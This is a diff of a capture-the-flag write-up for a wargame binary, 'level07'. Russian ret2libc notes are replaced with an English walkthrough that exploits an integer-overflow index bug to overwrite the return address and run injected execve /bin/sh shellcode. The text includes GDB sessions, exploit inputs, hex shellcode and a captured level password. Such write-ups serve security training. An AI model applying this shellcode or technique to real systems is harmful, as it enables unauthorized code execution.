@@ -1,64 +1,69 @@
-смотрим на какое место памяти записывает. Можем записать что угодно 
-перезаписываем адрес возврата
-вычисляем индекс. Он 114
-выясняем адрес system and bin/sh
+Level07
 
-Breakpoint 2, 0x080486c2 in store_number () before store number
+This binary provides a simple number storing interface with three commands:
 
-наш буффер 0x8(%ebp)
+    store, saves input number (int == 4 bytes) at input index (offset = index * 4).
+    read, display number stored at input index.
+    quit, exit the program.
 
-(gdb) x/10xw $ebp+0x8  
-0xffffd4f0:	0xffffd514	0x00000014	0xf7fcfac0	0xf7fdc714
-0xffffd500:	0x00000098	0xffffffff	0xffffd7d4	0xffffd778
-0xffffd510:	0x00000000	0x00000000
+This effectively allows us to write anything we want on the stack 4 bytes at a time. We will overwrite the EIP save to take control of the execution flow and redirect to some shellcode. However there is a input index % 3 check that prevents us from saving at any index that is divisible by 3. To obtain the correct offset to save the value at, the program takes the input index and shl eax, 2 which effectively multiplies by 4.
 
-0xffffd514 -- начало нашего стека.
-Значит i индекс заполняет адрес 0xffffd514+i*4
+To store at an index divisible by 3, we can simply input a value that will overflow to the true index value after the shl eax, 2. For example, to store at index 0, we can input 1073741824. Debugging is easy with the read command.
+Obtaining RET offset index
 
-будем перезаписывать адрес возврата main
-Чтоб его узнать:
-http://natalia.appmat.ru/c&c++/assembler.html
+Lets find the EIP save relative to the start of the buffer: 4 pushed registers (16) and esp, 0xfffffff0 (alignment to 16 bytes, removed 12 bytes) size of stack: 0x1d0 (464) start of buffer: esp+0x24 (36)
 
-Breakpoint 6, 0x080489f1 in main ()
-(gdb) i reg $esp
-esp            0xffffd6dc	0xffffd6dc
+(464-36+16+12)/4 = 114
 
-Переписать на что? на system with bin/sh
-1. находим адрес system 
-    (gdb) info func system
-    All functions matching regular expression "system":
+Find the integer that will overflow to 114 * 4: 1073741824 (a quarter of UINT_MAX) 1073741824 + 114 1073741938
 
-    Non-debugging symbols:
-    0xf7e6aed0  __libc_system
-    0xf7e6aed0  system
-    0xf7f48a50  svcerr_systemerr
-2.находим
-(gdb) find &system,+99999999,"/bin/sh"
-0xf7f897ec
+We can use read command to check if we are storing at the correct index (it should segfault when we quit)
 
-
-В какой индекс надо записать?
-(0xffffd6dc - 0xffffd514) / 4 = 0x72 = 114 (= 0 mod 3) 
-    Т.е. index = 144 (+ переполнение 2147483648+114 = 2147483762)
-
-Что записать? 
-    0xf7e6aed0 = 4159090384 
-    0xf7f897ec = 4160264172
-переполняем инт
-
-
-ОТВЕТ: 
-
+./level07
 Input command: store
- Number: 4159090384
- Index: 2147483762
+ Number: 45
+ Index: 1073741938
  Completed store command successfully
-Input command: store
- Number: 4160264172
- Index: 116
- Completed store command successfully
+Input command: read
+ Index: 114
+ Number at data[114] is 45
+ Completed read command successfully
+Input command: quit
+Segmentation fault (core dumped)
+
+Injecting our shellcode
+
+This program flushes environment variables and globals at the start of the execution disabling us from using them to store our shellcode. We will have to store the shellcode inside the databasei buffer. Lets find the address of our buffer:
+
+gdb level07
+b *0x08048795	; its address is loaded into ebx here
+r
+Breakpoint 1, 0x08048795 in main ()
+p (void*)$ebx
+$1 = (void *) 0xffffd504
+
+printf %d 0xffffd504
+4294956292
+
+Because gdb adds runtime environment variables, the address of our buffer is innacurate, adding some '\90' instruction padding and increasing our address by 32 bytes is enough to reach it. 4294956292 + 32 = 4294956324
+
+Our shellcode:
+
+\x90\x90\x90\x90 \x90\x90\x90\x90 \x90\x90\x90\x90 \x90\x90\x90\x90 		
+\x6a\x0b\x58\x99 \x52\x68\x2f\x2f \x73\x68\x68\x2f \x62\x69\x6e\x89 		
+\xe3\x31\xc9\xcd \x80 ; 21 bytes execv() shellcode + 16 bytes of padding		
+
+All that is left is placing our shellcode inside the buffer:
+
+    divide into 4 bytes sections
+    reverse them
+    convert to decimal
+    store them starting from index 0 (using the overflow exploit)
+
+To save time debugging we can list in a file all the commands to be passed to the program. (see ressource).
+
+cat /tmp/inj07 - | ./level07
+
 Input command: quit
 $ cat /home/users/level08/.pass
 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
-$
-
